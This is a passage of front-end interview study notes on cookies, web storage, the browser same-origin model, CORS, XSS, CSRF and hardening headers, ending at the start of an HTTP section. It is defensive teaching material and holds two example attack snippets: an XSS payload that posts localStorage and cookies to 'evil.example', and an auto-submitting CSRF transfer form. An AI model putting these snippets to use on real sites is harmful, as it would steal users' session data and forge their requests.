- **Server session** — server stores session state keyed by an opaque id; the id lives in a cookie.
- **Stateless token (JWT)** — self-contained signed token; server holds no session state but revocation is harder.
- **`localStorage`** — persistent (~5–10MB), synchronous, string-only, per-origin, JS-readable.
- **`sessionStorage`** — same API as `localStorage` but scoped to a single tab and cleared when it closes.
- **IndexedDB** — asynchronous, transactional, large-capacity, structured object store.
- **Cache API** — programmable store of `Request`/`Response` pairs, used by Service Workers for offline.

**Why interviewers ask this**

Storage choice is a security decision disguised as an API question. Junior signal: "I put the JWT in localStorage because it's easy." Senior signal: knows that localStorage is JS-readable and therefore XSS-exfiltratable, and reaches for an `HttpOnly` `Secure` `SameSite=Lax` cookie for the session, accepting the CSRF surface that cookies add and pairing it with anti-CSRF measures. It also probes performance awareness — a fat cookie set on your apex domain rides on every request to every subdomain including static assets, silently adding latency. And it tests whether you understand the browser's same-origin scoping of storage. Getting the storage-comparison table right, with the sent-to-server and XSS columns, is a strong senior tell.

**Common confusions**

- "Store the auth token in localStorage" — localStorage is readable by any script on the page, so an XSS bug leaks every user's token. Prefer `HttpOnly` cookies.
- "Cookies and localStorage are interchangeable" — only cookies are auto-sent to the server; only localStorage is invisible to the network. Different jobs.
- "`SameSite` fully stops CSRF" — `Lax` blocks most cross-site POSTs but not everything (top-level GETs still send it); defence in depth still matters.
- "localStorage is async" — it's **synchronous** and blocks the main thread; large reads/writes cause jank. IndexedDB is the async option.
- "sessionStorage is shared across tabs" — no, it's per-tab (per browsing context). localStorage is shared across tabs of the same origin.
- "HttpOnly cookies are safe from everything" — they resist XSS *reading*, but the cookie is still auto-sent, so CSRF and network interception (without `Secure`) remain concerns.

**What follows from this topic**

The XSS-vs-`HttpOnly` and CSRF-vs-`SameSite` threads lead straight into the Browser Security Model topic (and the Security primer). The "cookies ride every request" point connects to the HTTP/caching and web-performance material — cookie size is request overhead. IndexedDB and the Cache API reappear under Web APIs and Service Workers / offline. So this topic sits at the intersection of security and performance, and how you answer "where do I store the token" signals whether you think about both.

### Q1. What's the difference between a cookie and localStorage?

| | Cookie | localStorage |
|---|---|---|
| Sent to server | Yes, every matching request | No, client-only |
| JS-readable | Yes, unless `HttpOnly` | Always |
| Size | ~4KB | ~5–10MB |
| Expiry | `Expires`/`Max-Age`, or session | Until explicitly cleared |
| Scope | Domain + Path | Origin |
| API | `document.cookie` (string) or `Set-Cookie` | `localStorage.getItem/setItem` |

The load-bearing distinction: cookies are the only one the browser **sends to the server automatically**, which makes them the mechanism for auth/session state — but also means they cost bytes on every request and open a CSRF surface. localStorage never touches the network and is purely for client-side data.

### Q2. Walk through the important cookie attributes.

```http
Set-Cookie: sid=abc123; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=3600
```

- **`HttpOnly`** — JS can't read it via `document.cookie`; blocks XSS token theft. Use for session cookies.
- **`Secure`** — only transmitted over HTTPS; prevents leaking over plaintext.
- **`SameSite`** — `Strict` (never cross-site), `Lax` (top-level navigations only, modern default), `None` (all contexts, requires `Secure`). Primary CSRF control.
- **`Domain`** — which host(s) get the cookie. Omit for host-only (safest); set to `example.com` to include subdomains.
- **`Path`** — URL-path scope (`/` = whole site).
- **`Expires` / `Max-Age`** — absolute date vs seconds-from-now. With neither, it's a *session cookie* removed when the browsing session ends.

A session token cookie should be `HttpOnly; Secure; SameSite=Lax` (or `Strict` if no cross-site flows) at minimum.

### Q3. Explain `SameSite` and each of its values.

`SameSite` controls whether the browser attaches a cookie to **cross-site** requests — the core defence against CSRF.

- **`Strict`** — never sent on any cross-site request, including when the user *clicks a link* from another site. Most secure, but the user arrives at your site "logged out" until they navigate internally.
- **`Lax`** — sent on **top-level GET navigations** (clicking a link to your site) but not on cross-site subresource requests or cross-site POSTs. The modern browser default. Good balance for session cookies.
- **`None`** — sent in all cross-site contexts; **requires `Secure`**. Needed for legitimate cross-site cookies (third-party embeds, SSO iframes).

`Lax` blocks the classic CSRF attack (a malicious site auto-submitting a cross-site POST) while keeping normal link navigation working, which is why it's the sensible default for auth cookies.

### Q4. Why can a large cookie hurt performance?

Because cookies are attached to **every matching request** — HTML, API calls, and crucially static assets like images, CSS, and JS on the same domain. A 3KB cookie set on `example.com` adds ~3KB of upload to *every one of those requests*, and request headers aren't compressed as aggressively as bodies (HPACK helps on HTTP/2 but repetition still costs).

Mitigations:
- Keep cookies tiny — store an opaque session id, not user data.
- Serve static assets from a **cookieless domain/subdomain** (or a CDN host the cookie isn't scoped to) so asset requests carry no cookie.
- Scope with `Domain`/`Path` so the cookie only rides requests that actually need it.

This is a real senior insight: an over-broad cookie silently taxes the whole site's request path.

### Q5. Where should you store an authentication token, and why?

**Preferred: an `HttpOnly`, `Secure`, `SameSite` cookie.** Reasoning:

- `HttpOnly` means an XSS payload *cannot read the token* — the single biggest risk with token storage. localStorage/sessionStorage are JS-readable, so any injected script exfiltrates every token.
- `Secure` keeps it off plaintext connections; `SameSite=Lax`/`Strict` cuts the CSRF surface that cookies otherwise introduce.

The trade-off you must name: cookies are auto-sent, so they're a CSRF vector — pair them with `SameSite` and, for state-changing requests, anti-CSRF tokens or a double-submit pattern.

**localStorage** is tempting (easy, avoids CSRF since it's not auto-sent) but its XSS exposure is usually the worse trade — one script-injection bug leaks all tokens. If you must (e.g. a token needed by JS for a cross-domain API), minimise XSS aggressively (CSP, escaping) and keep token lifetimes short.

### Q6. Compare localStorage, sessionStorage, cookies, IndexedDB, and the Cache API.

| | localStorage | sessionStorage | Cookies | IndexedDB | Cache API |
|---|---|---|---|---|---|
| Persistence | Until cleared | Per-tab, till close | `Max-Age`/session | Until cleared | Until cleared |
| Size | ~5–10MB | ~5–10MB | ~4KB | Large (100s MB+) | Large |
| Sync/async | Sync | Sync | Sync (`document.cookie`) | Async | Async (Promise) |
| Scope | Origin | Tab (browsing context) | Domain + Path | Origin | Origin |
| Sent to server | No | No | Yes, every request | No | No |
| Data shape | Strings | Strings | Strings | Structured objects | Request/Response |
| Security note | JS-readable (XSS) | JS-readable (XSS) | `HttpOnly` hides from JS | JS-readable | JS-readable |

Rule of thumb: small client-only key-value → local/sessionStorage; must reach the server automatically → cookie; large/structured/offline data → IndexedDB; cached HTTP responses for offline → Cache API (via a Service Worker).

### Q7. localStorage vs sessionStorage — when do you use each?

Identical API (`Storage`), different lifetime and scope:

- **localStorage** — persists across tabs and browser restarts, shared by all tabs of the same origin. Use for data that should survive a reload/reopen: theme preference, a draft, a "seen this banner" flag.
- **sessionStorage** — scoped to a **single tab** and wiped when that tab closes; a second tab gets its own empty copy. Use for per-tab ephemeral state: a multi-step form's progress, a scroll position for this visit, a one-tab checkout flow.

Gotcha: opening a link in a new tab via "duplicate tab" copies sessionStorage, but a fresh tab to the same origin does not share it. Both are synchronous and string-only (`JSON.stringify` your objects).

### Q8. How does XSS turn JS-readable storage into a breach?

XSS runs attacker JavaScript in your origin's context — so it has the same access your own code does. Any store that JS can read is fully exposed:

```javascript
// Injected via an XSS hole:
fetch('https://evil.example/steal', {
  method: 'POST',
  body: JSON.stringify({
    ls: { ...localStorage },
    cookies: document.cookie,   // only NON-HttpOnly cookies appear here
  }),
});
```

Everything in `localStorage`, `sessionStorage`, and IndexedDB is readable; so are non-`HttpOnly` cookies. This is the concrete reason to keep session tokens in `HttpOnly` cookies — `document.cookie` simply won't include them, so the payload above captures nothing useful. Storage choice doesn't *prevent* XSS (fix that with escaping + CSP), but it decides how much an XSS bug can steal.

### Q9. What's the difference between a session cookie and a persistent cookie?

- **Session cookie** — has neither `Expires` nor `Max-Age`. The browser deletes it when the browsing session ends (typically when the browser closes — though "session restore" features can preserve it). Good for "log me out when I close the browser" semantics.
- **Persistent cookie** — has an `Expires` date or `Max-Age` seconds; survives restarts until that time. Good for "remember me" and long-lived preferences.

```http
Set-Cookie: sid=abc; HttpOnly            ← session cookie
Set-Cookie: sid=abc; HttpOnly; Max-Age=2592000  ← persists 30 days
```

Note "session cookie" (lifetime) is a different concept from a "session" (server-side auth state) — the terms overlap confusingly.

### Q10. Server-side sessions vs stateless JWTs — trade-offs?

**Server session** — server stores the session state (user id, roles) in memory/Redis/DB, keyed by an opaque id; only that id sits in the cookie.
- Easy **revocation** (delete the server record → instantly logged out).
- Server holds state → needs shared session storage to scale horizontally.
- Cookie stays tiny.

**Stateless JWT** — a signed token containing the claims themselves; server verifies the signature and trusts the payload, storing nothing.
- **Scales** trivially (no server state, any node can verify).
- **Revocation is hard** — a valid token works until it expires; you need short lifetimes + refresh tokens or a denylist (which reintroduces state).
- Larger, and must never be tampered-with (signature) — never put secrets in it (it's only base64, not encrypted).

Common hybrid: short-lived JWT access token + server-tracked refresh token for revocability.

### Q11. Can JavaScript read an `HttpOnly` cookie? How do you work with it then?

No — `HttpOnly` cookies are absent from `document.cookie` by design. You never touch them in JS; you rely on the browser to **attach them automatically** to requests:

```javascript
// The session cookie rides along automatically for same-origin;
// use credentials:'include' for cross-origin (needs CORS to allow it).
fetch('/api/me', { credentials: 'include' })
  .then(r => r.json());
```

The server reads the cookie from the `Cookie` header and responds. This is the point: your JS orchestrates requests without ever handling the secret, so XSS can't lift it. If you need a value in JS *and* the server, use two cookies (or a non-`HttpOnly` companion), never downgrade the session cookie.

### Q12. What's a `__Host-` / `__Secure-` cookie prefix?

Cookie name prefixes the browser enforces to harden cookies:

- **`__Secure-`** — the cookie is rejected unless it's set with `Secure` over HTTPS.
- **`__Host-`** — stronger: requires `Secure`, no `Domain` attribute (host-only, so subdomains can't set/read it), and `Path=/`. This prevents a compromised or malicious subdomain from writing a cookie that your apex domain would trust.

```http
Set-Cookie: __Host-sid=abc; Secure; Path=/; HttpOnly; SameSite=Lax
```

They're a cheap defence against subdomain cookie-injection ("cookie tossing"). If the attributes don't match the prefix's rules, the browser silently ignores the `Set-Cookie`.

### Q13. Why is IndexedDB used over localStorage for large or structured data?

- **Async** — IndexedDB is non-blocking; localStorage is synchronous and stalls the main thread on big reads/writes (jank). For megabytes of data this matters.
- **Capacity** — hundreds of MB+ vs localStorage's ~5–10MB cap.
- **Structured** — stores real objects, blobs, and files with indexes and transactions; localStorage only stores strings, forcing `JSON.stringify`/`parse` round-trips.
- **Queryable** — indexes and cursors let you look up records without loading everything.

The cost is a clunkier, event/Promise-based API — most teams wrap it (idb, Dexie). Use it for offline datasets, cached API results, media, or anything you'd otherwise cram into localStorage and regret. localStorage stays fine for a handful of small flags.

### Q14. The `storage` event — what is it and what's a use case?

`localStorage`/`sessionStorage` writes fire a `storage` event **in other tabs of the same origin** (not the tab that made the change):

```javascript
window.addEventListener('storage', (e) => {
  if (e.key === 'auth') location.reload(); // logged out elsewhere → sync this tab
});
```

Use cases: **cross-tab sync** — propagate logout, theme changes, or cart updates across all open tabs. It's a simple, dependency-free tab-to-tab channel (though `BroadcastChannel` is the more purpose-built modern API). Note it only fires for `localStorage` cross-tab, not for changes in the same tab.

### Q15. A cookie set on login isn't being sent on later API calls. What are the likely causes?

Walk the attributes and the request:

- **Cross-origin fetch without credentials** — `fetch` doesn't send cookies cross-origin unless `credentials: 'include'`, and the server must send `Access-Control-Allow-Credentials: true` with a specific (non-`*`) `Access-Control-Allow-Origin`.
- **`SameSite`** — a `Strict`/`Lax` cookie won't ride cross-site requests (e.g. your API on a different site); may need `SameSite=None; Secure`.
- **`Secure` over HTTP** — a `Secure` cookie is dropped on plaintext; check you're on HTTPS.
- **`Domain`/`Path` mismatch** — cookie scoped to `app.example.com` won't go to `api.example.com`; a `Path=/admin` cookie won't ride `/api` requests.
- **Expired** — `Max-Age` elapsed, or it was a session cookie and the session ended.

Diagnose in DevTools → Application → Cookies (attributes) and Network → the request's `Cookie` header.

### Q16. When would you deliberately choose the Cache API over the others?

The Cache API stores `Request`/`Response` pairs and is the storage layer for **Service Worker offline strategies**. Choose it when you want to serve actual HTTP responses without the network:

```javascript
// In a service worker — cache-first for static assets:
self.addEventListener('fetch', (e) => {
  e.respondWith(
    caches.match(e.request).then(hit => hit || fetch(e.request))
  );
});
```

Use it for: offline-capable apps (precache the app shell), fast repeat loads (cache-first for fonts/images/JS), and network-first-with-fallback for API data. It's not for arbitrary app state (use IndexedDB for that) — it's specifically for cached network responses. Together, Service Worker + Cache API + IndexedDB are the offline toolkit.

## Browser Security Model

### Summary

**What this topic covers**

How the browser isolates origins and the mechanisms that carefully relax that isolation — the defensive layer between your app and a hostile web. Three concern areas: (1) **isolation** — the same-origin policy (SOP), the foundation that stops `evil.example` reading your `bank.example` data, and CORS as the *controlled* relaxation of it; (2) **injection & confused-deputy attacks** — XSS and CSRF from the browser's perspective, each paired with its browser-side defence (CSP + output encoding for XSS; `SameSite` + anti-CSRF tokens for CSRF); and (3) **hardening headers & primitives** — CSP, `X-Frame-Options`/`frame-ancestors` for clickjacking, `iframe sandbox`, Subresource Integrity, and the mixed-content rule. The 16 questions go from "what is an origin" and "SOP vs CORS" warm-ups to senior scenarios like designing a CSP, reasoning about why a preflight fired, and choosing defences for a token. This is the browser-side companion to the Security primer — here we stay at the browser mechanism level and cross-reference the Security primer for the server/protocol depth.

**Mental model**

Start from one rule: **the same-origin policy** — script from one origin (scheme + host + port) can't read data from another origin. That's the wall. Everything else is either a *deliberate hole* in the wall (CORS lets a server opt specific origins in; `postMessage` lets frames talk across it) or a *defence for when the attacker gets code or requests through anyway*. Frame the whole topic as **risk → browser-side mitigation** pairs: XSS (attacker runs script in your origin) → output encoding + Content-Security-Policy; CSRF (attacker makes the browser send an authenticated request) → `SameSite` cookies + anti-CSRF tokens; clickjacking (your page framed invisibly) → `frame-ancestors`; compromised CDN → Subresource Integrity; downgraded assets → block mixed content; untrusted embed → `iframe sandbox`. The browser gives you these knobs; your job is to know which risk each one addresses and to layer them (defence in depth), because no single control is complete.

**Key terms**

- **Origin** — the tuple `(scheme, host, port)`. `https://a.example` ≠ `http://a.example` ≠ `https://a.example:8443` ≠ `https://b.example`.
- **Same-origin policy (SOP)** — the browser default: script may not read responses/DOM/storage from another origin.
- **CORS** — server-driven relaxation of SOP via `Access-Control-Allow-*` headers, letting named origins read cross-origin responses.
- **Preflight** — an automatic `OPTIONS` request the browser sends before "non-simple" cross-origin requests to check permission.
- **CSP (Content-Security-Policy)** — a header restricting which sources of script/style/etc. may load and execute; the main XSS mitigation.
- **XSS** — injection of attacker script into your page, running in your origin.
- **CSRF** — tricking a logged-in user's browser into sending a state-changing request using its ambient cookies.
- **Clickjacking** — overlaying your page invisibly in an iframe to hijack clicks; blocked by `frame-ancestors`/`X-Frame-Options`.
- **`iframe sandbox`** — attribute that strips an embedded frame's capabilities (scripts, forms, same-origin) unless re-granted.
- **Subresource Integrity (SRI)** — an `integrity` hash on `<script>`/`<link>` so the browser rejects a tampered CDN file.
- **Mixed content** — HTTPS page loading HTTP subresources; browsers block/upgrade it.
- **`credentials` mode** — whether a cross-origin `fetch` sends cookies (`include`) — requires matching CORS credential headers.

**Why interviewers ask this**

Front-end security separates people who ship features from people who ship *safe* features. Junior signal: thinks CORS is an error to "turn off," disables it with `Access-Control-Allow-Origin: *` on a credentialed API, stores tokens in localStorage. Senior signal: explains SOP as the default and CORS as a *server's* deliberate opt-in (not something the client bypasses), knows a preflight is triggered by custom headers/methods, can sketch a CSP that kills inline-script XSS, pairs `SameSite` with CSRF tokens, and reflexively pairs each risk with its mitigation. Because front-end bugs (XSS especially) are among the most common real-world breaches, interviewers use this to gauge whether you'll be a liability. It also reveals whether you understand the boundary between browser-enforced controls and server responsibilities.

**Common confusions**

- "CORS protects my server" — no. CORS *relaxes* SOP for browsers; it doesn't stop non-browser clients (curl, servers) at all. It protects *users* from a page reading another origin's data, not your API from being called.
- "`Access-Control-Allow-Origin: *` is a safe default" — it forbids credentials and, on a sensitive API, can expose data; never combine `*` with credentialed requests.
- "CSP stops all XSS" — it mitigates and limits impact (especially inline script), but a permissive policy or a `'unsafe-inline'` escape hatch reopens the door. Output encoding is still primary.
- "CSRF needs XSS" — no; CSRF works *without* running script on your site, by abusing the browser auto-sending cookies from another site.
- "SOP blocks cross-origin requests" — it doesn't block *sending* them (forms/images/scripts fire cross-origin freely); it blocks *reading the response* via script.
- "An iframe is isolated by default" — a same-origin iframe shares your origin; isolation needs `sandbox` and/or a different origin.

**What follows from this topic**

This is the browser-side face of the Security primer — cross-reference it for the protocol/server depth on XSS, CSRF, TLS, and auth. SOP and CORS tie into the HTTP/networking material (preflights are extra round trips; cross-ref Networking for the wire view). The XSS ↔ storage link runs back to Cookies, Sessions & Web Storage (why `HttpOnly` matters). CSP and SRI touch the loading-performance topic (they constrain what and how you load). Treat every browser mechanism here as one layer of defence in depth; the interview reward is showing you never rely on just one.

### Q1. What exactly is an "origin"?

An origin is the tuple **(scheme, host, port)**. Two URLs are same-origin only if all three match:

```
https://app.example.com          ← base
https://app.example.com/other    ✓ same origin (path doesn't matter)
http://app.example.com           ✗ different scheme
https://app.example.com:8443     ✗ different port
https://api.example.com          ✗ different host (subdomain counts)
```

Note "site" is looser than "origin" — a *site* is roughly the registrable domain (`example.com`), so `app.` and `api.example.com` are *same-site but cross-origin*. That distinction matters: SOP works at origin granularity, while `SameSite` cookies work at site granularity.

### Q2. What is the same-origin policy and what does it actually block?

SOP is the browser's default isolation: **script from origin A cannot read data from origin B.** Concretely it blocks script from:

- Reading the **response body** of a cross-origin `fetch`/XHR.
- Accessing the **DOM** of a cross-origin iframe.
- Reading another origin's **cookies**, `localStorage`, or IndexedDB.

Crucially, SOP does **not** block *sending* cross-origin requests. A form can POST to any origin, an `<img>` can load any URL, a `<script src>` can pull from any host — the request goes out (and side effects happen), the browser just hides the *response* from your script. That gap is exactly what CSRF exploits (side effect without needing to read the response).

### Q3. Explain CORS and how it relaxes the same-origin policy.

CORS (Cross-Origin Resource Sharing) is how a **server opts specific origins into** reading its responses, punching a controlled hole in SOP. The browser enforces it based on response headers the server sends:

```http
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Methods: GET, POST
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Allow-Credentials: true
```

Key mental correction: CORS is a **server-side grant**, not a client-side bypass. The client can't "disable CORS"; the *server* decides who may read its data, and the *browser* enforces that decision. It also only governs browsers — curl or a server-to-server call ignores CORS entirely. So CORS protects *your users* from a malicious page reading another origin's data; it is not access control for your API.

### Q4. Simple vs preflighted requests — what triggers a preflight?

The browser sends an automatic **`OPTIONS` preflight** before "non-simple" cross-origin requests to ask permission first.

A request is **simple** (no preflight) only if it's `GET`/`POST`/`HEAD`, uses only safelisted headers, and its `Content-Type` is `application/x-www-form-urlencoded`, `multipart/form-data`, or `text/plain`.

It's **preflighted** if it uses any other method (`PUT`, `DELETE`, `PATCH`), custom headers (`Authorization`, `X-*`), or `Content-Type: application/json` — which covers most real JSON APIs.

```http
OPTIONS /api/users HTTP/1.1
Origin: https://app.example.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: Content-Type

HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Methods: PUT
Access-Control-Allow-Headers: Content-Type
```

Preflights add a round trip; cache them with `Access-Control-Max-Age` to avoid re-asking on every call.

### Q5. How do credentials (cookies) interact with CORS?

By default a cross-origin `fetch` sends **no cookies**. To include them you set `credentials: 'include'`, and the server must respond with specific headers:

```javascript
fetch('https://api.example.com/me', { credentials: 'include' });
```

```http
Access-Control-Allow-Origin: https://app.example.com   ← must be exact, NOT *
Access-Control-Allow-Credentials: true
```

The hard rule: with credentials you **cannot** use `Access-Control-Allow-Origin: *` — it must echo the exact origin, and you must send `Allow-Credentials: true`. This prevents a wildcard-configured API from leaking authenticated data to any origin. Also, cross-site cookies now need `SameSite=None; Secure` to be sent at all.

### Q6. What is XSS and what are the browser-side defences?

XSS (Cross-Site Scripting) is injecting attacker JavaScript that runs in *your* origin — so it can read JS-accessible storage, forge requests with the user's cookies, and rewrite the page. Types: **stored** (persisted, e.g. a malicious comment), **reflected** (echoed from the URL), **DOM-based** (client-side sink like `innerHTML`).

Browser-side/front-end defences, layered:

- **Output encoding / escaping** — context-aware escape all untrusted data; treat data as text, not HTML. Primary defence.
- **Avoid dangerous sinks** — no `innerHTML`/`eval`/`document.write` with untrusted input; use `textContent`, and frameworks' auto-escaping (avoid `dangerouslySetInnerHTML`).
- **Content-Security-Policy** — blocks inline scripts and unknown sources, containing impact even if injection slips through.
- **Trusted Types** — a newer CSP feature forcing DOM-XSS sinks to accept only sanitised values.
- **`HttpOnly` cookies** — so an XSS payload can't read the session token (cross-ref the storage topic).

Cross-reference the Security primer for the full XSS taxonomy; here the emphasis is the browser mechanisms.

### Q7. What is CSRF and why doesn't it require running script on my site?

CSRF (Cross-Site Request Forgery) abuses the browser **auto-attaching cookies**. A user logged into `bank.example` visits `evil.example`, which triggers a request to the bank:

```html
<!-- On evil.example — no script needed -->
<form action="https://bank.example/transfer" method="POST">
  <input name="to" value="attacker"><input name="amount" value="1000">
</form>
<script>document.forms[0].submit()</script>
```

The browser sends the bank's session cookie along automatically (ambient authority), so the transfer executes as the victim. It needs **no XSS** and can't read the response (SOP hides it) — it only needs the *side effect*.

Browser-side defences: **`SameSite=Lax/Strict` cookies** (stop the cookie riding cross-site requests), **anti-CSRF tokens** (a per-session secret the attacker can't read due to SOP), checking **`Origin`/`Referer`**, and requiring non-simple content types that force a CORS preflight the attacker can't satisfy.

### Q8. Contrast XSS and CSRF and their mitigations.

| | XSS | CSRF |
|---|---|---|
| Attacker capability | Runs script in your origin | Makes browser send an authed request |
| Needs script on your site | Yes | No |
| Can read the response | Yes (same origin) | No (SOP hides it) |
| Root cause | Unescaped untrusted input | Ambient cookie auth |
| Primary defence | Output encoding + CSP | `SameSite` + anti-CSRF token |
| Storage angle | `HttpOnly` limits token theft | `SameSite` limits cookie sending |

Key point for interviews: they're different classes. XSS is a *code injection* problem (fix by not executing untrusted data); CSRF is a *request forgery* problem (fix by not trusting ambient cookies alone). `HttpOnly` helps XSS-token-theft but does nothing for CSRF; `SameSite` helps CSRF but nothing for XSS.

### Q9. How does a Content-Security-Policy mitigate XSS? Sketch one.

CSP is a response header (or meta tag) that whitelists where resources may load from and, critically, **disables inline script** by default — which defeats most injected `<script>` and inline event handlers even if injection succeeds.

```http
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-r4nd0m';
  style-src 'self';
  img-src 'self' data:;
  object-src 'none';
  base-uri 'self';
  frame-ancestors 'none'
```

- `script-src 'self'` + a per-request **nonce** means only your scripts and nonce-tagged inline scripts run; an injected `<script>` without the nonce is blocked.
- Avoid `'unsafe-inline'`/`'unsafe-eval'` — they reopen the hole.
- `object-src 'none'` and `base-uri 'self'` close common bypasses.

CSP is a *mitigation/defence-in-depth*, not a substitute for escaping — it limits the blast radius when an XSS bug exists.

### Q10. What is clickjacking and how do you prevent it?

Clickjacking overlays your page in a **transparent iframe** on the attacker's site so the victim, thinking they're clicking the attacker's UI, actually clicks your app (e.g. a "delete account" or "confirm payment" button).

Browser-side defences — tell browsers who may frame you:

```http
Content-Security-Policy: frame-ancestors 'none'        ← modern, preferred
X-Frame-Options: DENY                                   ← legacy fallback
```

- **`frame-ancestors`** (CSP) — specify exactly which origins may embed you (`'none'`, `'self'`, or a list). Supersedes `X-Frame-Options` and is more flexible.
- **`X-Frame-Options: DENY`/`SAMEORIGIN`** — older header, still worth sending for old browsers.

Set these on any page with authenticated, state-changing actions.

### Q11. What does the `iframe sandbox` attribute do?

`sandbox` strips an embedded frame's capabilities to a minimum, then lets you re-grant only what's needed — the principle of least privilege for embeds:

```html
<iframe src="https://untrusted.example/widget"
        sandbox="allow-scripts allow-forms"></iframe>
```

With a bare `sandbox` (no tokens): scripts blocked, forms blocked, treated as a **unique/opaque origin** (so it can't touch your cookies/storage/DOM), popups/top-navigation blocked, plugins blocked. You opt features back in with tokens: `allow-scripts`, `allow-forms`, `allow-same-origin`, `allow-popups`, etc.

Sharp edge: granting **both** `allow-scripts` and `allow-same-origin` to content from your own origin lets it remove its own sandbox, so don't combine them for same-origin untrusted content. Use `sandbox` for any third-party or user-provided embed.

### Q12. What is Subresource Integrity and what attack does it stop?

SRI lets you pin a cryptographic hash on an external `<script>`/`<link>` so the browser **refuses to run a file that's been tampered with** — defending against a compromised CDN or a man-in-the-middle swapping the asset:

```html
<script src="https://cdn.example/lib.js"
        integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
        crossorigin="anonymous"></script>
```

The browser hashes the fetched bytes and blocks execution if they don't match. Use it for any third-party script you load by URL. Trade-off: you must update the hash whenever the file legitimately changes, so SRI suits versioned/immutable URLs, not files that mutate under a stable URL.

### Q13. What is mixed content and how does the browser handle it?

Mixed content is an **HTTPS page loading resources over plain HTTP** — those subresources are interceptable/injectable, undermining the page's security.

Browsers split it:
- **Active mixed content** (scripts, iframes, CSS, XHR/fetch) — **blocked outright**, because a MITM could alter it to run code.
- **Passive mixed content** (images, video, audio) — historically warned, now increasingly blocked or auto-upgraded.

Fixes: serve every subresource over HTTPS, and use `Content-Security-Policy: upgrade-insecure-requests` to have the browser rewrite `http://` subresource URLs to `https://` automatically. The rule of thumb: an HTTPS page must load *only* HTTPS resources.

### Q14. Is `postMessage` a safe way to communicate across origins? What must you check?

`window.postMessage` is the *sanctioned* channel across the SOP wall between windows/iframes/workers — but it's only safe if you validate both directions:

```javascript
// Sender — always target a specific origin, never '*'
frame.contentWindow.postMessage(data, 'https://widget.example');

// Receiver — always verify the sender's origin before trusting data
window.addEventListener('message', (e) => {
  if (e.origin !== 'https://widget.example') return;  // critical check
  handle(e.data);
});
```

Two common bugs: sending with `'*'` as targetOrigin (any window can read it) and, worse, **not checking `e.origin`** on receipt (any site can message you and you'd trust it). Treat incoming `e.data` as untrusted input regardless.

### Q15. Why is `Access-Control-Allow-Origin: *` dangerous on a credentialed API?

Two problems:

1. **Spec-forbidden with credentials** — the browser rejects a credentialed response if the server answered `*`; it must echo the exact requesting origin. So `*` simply won't work for cookie-authed endpoints.
2. **Over-exposure if you "fix" it wrong** — if you reflect *any* origin back unconditionally (echoing `Origin` without an allowlist) plus `Allow-Credentials: true`, you've effectively let every site read authenticated responses — a data-leak hole.

Correct approach: maintain a server-side **allowlist** of trusted origins, echo only matching ones, and send `Allow-Credentials: true` only for those. Reserve `*` for genuinely public, non-credentialed resources (e.g. a public CDN/JSON endpoint).

### Q16. Design the browser-side defences for a page with authenticated, state-changing actions.

Layer them — each addresses a distinct risk (defence in depth):

- **Session token** → `HttpOnly; Secure; SameSite=Lax` (or `Strict`) cookie: unreadable by XSS, not sent cross-site, HTTPS-only. (Storage topic.)
- **XSS** → context-aware output encoding + a strict **CSP** with nonces and no `'unsafe-inline'`; avoid `innerHTML` sinks.
- **CSRF** → `SameSite` cookie *plus* an anti-CSRF token (double-submit or synchroniser) for state-changing POSTs; verify `Origin`.
- **Clickjacking** → `frame-ancestors 'none'` (and `X-Frame-Options: DENY`).
- **Third-party scripts** → **SRI** hashes + `crossorigin`; minimise how many you load.
- **Transport** → HTTPS everywhere, `upgrade-insecure-requests`, HSTS (server-set) so there's no HTTP downgrade.
- **Untrusted embeds** → `iframe sandbox` with least privilege.

The interview point isn't reciting headers — it's pairing each *risk* with its *specific* browser mitigation and showing you never rely on a single control. Cross-reference the Security primer for the server-side half (hashing, TLS config, auth).
## HTTP & Networking from the Browser

### Summary

**What this topic covers**

How the browser actually talks to the network, and how that shapes front-end performance. This is the browser's view of HTTP — not the wire-level packet mechanics (that's the Networking primer's job, cross-ref it for TCP/TLS/QUIC internals) but the layer a front-end engineer tunes: **the request sequence** (DNS → TCP → TLS → HTTP), **connection reuse** and keep-alive, the **HTTP/1.1 vs HTTP/2 vs HTTP/3** version differences and how each changes your bundling and loading strategy, **request waterfalls** and how to flatten them, HTTP **methods and status codes** at a glance, and the response headers that drive caching (`Cache-Control`, `ETag`) and payload size (gzip/brotli). The 16 questions here connect "what the network does" to "what you should do about it in the front end." Where caching gets deep it hands off to the Browser Caching topic; where loading strategy gets deep it hands off to Web Performance — Loading.

**Mental model**

Every asset on a page — HTML, CSS, JS, fonts, images, API calls — is a separate HTTP request, and each request costs a round trip (or several) before the first byte arrives. Think of a page load as a **dependency graph of requests over time**: the browser can only fetch what it has discovered, and it discovers most sub-resources by parsing the HTML and CSS it already downloaded. That's why the shape of your load is a *waterfall* — later requests wait on earlier ones. The two levers you control are (1) **how many requests can happen at once** (bounded by the HTTP version and connection limits) and (2) **how early each request starts** (bounded by discovery — hence preload/preconnect hints). Under HTTP/1.1 the browser opens ~6 connections per origin and each carries one request at a time, so you bundled aggressively and sharded domains. Under HTTP/2 one connection multiplexes everything, so bundling matters less and can even hurt. Get this graph-over-time picture and every perf tactic — bundling, hints, CDNs, caching — becomes obvious.

**Key terms**

- **Round trip (RTT)** — one there-and-back to the server; latency, not bandwidth, dominates most page loads.
- **DNS resolution** — hostname → IP; a lookup that itself costs a round trip unless cached.
- **TCP handshake** — SYN/SYN-ACK/ACK, one RTT before any data.
- **TLS handshake** — encryption setup, 1–2 extra RTTs (1 with TLS 1.3, 0 on resumption).
- **Head-of-line (HOL) blocking** — one stalled request blocks others behind it; at the HTTP layer in H1, at the TCP layer in H2.
- **Multiplexing** — many concurrent requests interleaved over one connection (HTTP/2+).
- **Keep-alive / connection reuse** — reusing an open TCP+TLS connection for later requests, skipping the handshakes.
- **Request waterfall** — sequential dependency chain of requests where each starts only after a parent finishes.
- **`Cache-Control` / `ETag`** — response headers governing whether and how a response is reused (see Browser Caching).
- **Content-Encoding** — gzip/brotli compression of the response body.
- **Conditional request** — `If-None-Match`/`If-Modified-Since` → `304 Not Modified`, revalidation without re-download.
- **Origin** — scheme + host + port; connection pools and CORS are per-origin.

**Why interviewers ask this**

